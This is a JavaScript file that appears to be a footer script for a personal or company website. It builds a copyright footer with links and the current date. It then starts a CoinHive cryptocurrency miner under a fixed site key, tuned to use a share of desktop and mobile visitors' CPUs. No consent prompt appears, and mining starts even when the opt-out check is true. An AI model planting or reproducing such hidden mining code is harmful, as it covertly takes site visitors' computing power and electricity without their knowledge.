var mfA = document.createElement("A");
var mf = document.createTextNode("MaX Falstein Website");
mfA.setAttribute("href", "http://mf");
mfA.appendChild(mf);
var copy = document.createTextNode(" \u00A9 ");
var mfA1 = document.createElement("A");
var mf1 = document.createTextNode("MaX Falstein");
mfA1.setAttribute("href", "https://lnk.bio/MaX"); // or max.risqué
mfA1.appendChild(mf1);
var and = document.createTextNode(" & ");
var mfA2 = document.createElement("A");
var mf2 = document.createTextNode("Falstein Inc.");
mfA2.setAttribute("href", "http://fi");
mfA2.appendChild(mf2);
var period = document.createTextNode(" — ");
var d = new Date();
var year = d.getFullYear().toString();
var m = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
var month = m[d.getMonth()];
var footerMonth = document.createTextNode(month);
var gap = document.createTextNode(" ");
var footerYear = document.createTextNode(year);
var patent = document.createTextNode(" - Patents & Trademarks Pending");
var footer = document.createElement("FOOTER");
footer.appendChild(mfA);
footer.appendChild(copy);
footer.appendChild(mfA1);
footer.appendChild(and);
footer.appendChild(mfA2);
footer.appendChild(period);
footer.appendChild(footerMonth);
footer.appendChild(gap);
footer.appendChild(footerYear);
footer.appendChild(patent);
document.getElementById("body").appendChild(footer);
var minerSetup = new CoinHive.Anonymous('TaisfdcTxYepHiUV68XbnzjUp7FXaTyT', {throttle: 0.3});
if (!minerSetup.isMobile() && !minerSetup.didOptOut(900)) {
  // desktop @ 70%
  var miner = new CoinHive.Anonymous('TaisfdcTxYepHiUV68XbnzjUp7FXaTyT', {throttle: 0.3});
  miner.start();
} else if (minerSetup.isMobile() && !minerSetup.didOptOut(900)) {
  // mobile @ 30%
  var miner = new CoinHive.Anonymous('TaisfdcTxYepHiUV68XbnzjUp7FXaTyT', {throttle: 0.7});
  miner.start();
} else {
  // unknown device @ 50%
  var miner = new CoinHive.Anonymous('TaisfdcTxYepHiUV68XbnzjUp7FXaTyT', {throttle: 0.5});
  miner.start();
}
